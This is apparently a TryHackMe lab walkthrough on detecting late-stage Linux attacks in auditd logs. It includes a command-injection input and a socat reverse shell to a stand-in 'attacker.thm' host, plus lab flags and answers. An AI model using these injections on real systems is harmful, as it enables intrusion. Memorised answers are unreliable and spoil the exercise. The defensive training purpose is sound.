<img width="1512" height="798" alt="image" src="https://github.com/user-attachments/assets/74765c8f-24d0-4f66-a3e9-83ce91c67b6b" /><p align="center">
  <img src="https://assets.tryhackme.com/img/logo/tryhackme_logo_full.svg" width="150" alt="TryHackMe Logo">
</p>

# Linux Threat Detection 3
|  Room Name | Linux Threat Detection 3 |
|----------|-------|
| Author | Dhruv Tripathi |
| Link | [Linux Threat Detection 3](https://tryhackme.com/room/linuxthreatdetection3) |

# Room Information
```bash Type: Walkthrough
Difficulty: Medium  
Tags: - 
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Premium
Description:
Cover the last stages of attacks on Linux and learn how they look in system logs.
```
## Task 1

### Let's go!

- Answer: `No answer needed`

## Task 2

### Run `127.0.0.1 && whoami` in the TryPingMe web app. What output do you see after the ping results?

- For this question, we needed to launch the Attackbox and go to the TryPingMe web application at `http://MACHINE_IP:8000`. Once we enter the command into the textbox, the application returns the answer. This is an example of OS command injection, which occurs when a web application fails to properly validate or sanitise user input and passes it directly to the system shell for execution. In this case, the first command checks the loopback address. Since that check returns true, the `whoami` command is then executed, which displays the username of the user running the command
  
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/2bb79076-0693-464d-ad0b-1de92b6ff7a8" />
</p>

- Answer: `svctrypingme`

### Now try spawning a reverse shell to the imaginary "attacker.thm" address. Run `127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh` in the web app. What is the flag returned in the TryPingMe response?

- Similar to the last question, we can enter the command into the textbox. This is another example of OS command injection. The first command checks the loopback address, and if successful, the `socat` command establishes a TCP connection to the attacker's machine on port `1337` and attempts to provide access to the server's shell. This is known as a reverse shell

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/69d1873d-0c92-4681-b477-e1102fb0713a" />
</p>

- Answer: `THM{revshells_practitioner!}`

### Now look at the exported auditd logs at /home/ubuntu/scenario. Which IP spawned a similar reverse shell via the TryPingMe app?

- We can filter via `ausearch -i -if /home/ubuntu/scenario/audit.log -x socat` to search the audit logs for executions of `socat`. In the output, I found a TCP connection to `10.14.105.255` on port `1337`. The working directory was `/opt/trypingme`, indicating that the command originated from the TryPingMe application

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/b7259930-73e9-422a-b1fb-9ad5a5232836" />
</p>

- Answer: `10.14.105.255`

## Task 3

### Which command line was used to look for the "pass" keyword in files?

- We can search the log file via `ausearch -i -if /home/ubuntu/scenario/audit.log | grep pass`. Looking at the four lines of output, while `find` searched for filenames containing `pass`, the only command used to look for `pass` inside files was `grep`. The second entry `proctitle=grep -iR pass .` shows `grep` running recursively `-R` and case-insensitively `-i` to search for the string pass within the contents of files in the current directory

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/043f870e-0e12-4898-9c6f-4899acee2e5b" />
</p>

- Answer: `grep -iR pass .`

### Which command line was used to escalate privileges to root?

- To find how privileges were escalated, we can filter the log for root activity using `ausearch -i -if /home/ubuntu/scenario/audit.log | grep root`. Looking at the first two lines of the output `(proctitle=su root and a0=su a1=root)`, we can see the threat actor used `su root` to switch to the root user

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/1048f9b2-782d-47ca-82eb-f1e21e07138e" />
</p>

- Answer: `su root`

### Looking at the detected .env file, what was the root password?

- We know the attacker read the `.env.local` file as seen below

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/2658758e-6e03-4d2c-a27b-9f42a5d4aa1b" />
</p>

- Now the question was: where was this file actually located? To search the entire filesystem starting from the root directory, we can run `sudo find / -name ".env.local"`. This shows where the file is located at

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/aa09422f-5567-464b-bfb5-f10699d5ea4e" />
</p>

- We can navigate to the above location and read the file getting the root's password

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/cf2ae2ed-dd11-4b12-bbe8-c03d2f4248e4" />
</p>

- Answer: `nGql1pQkGa`
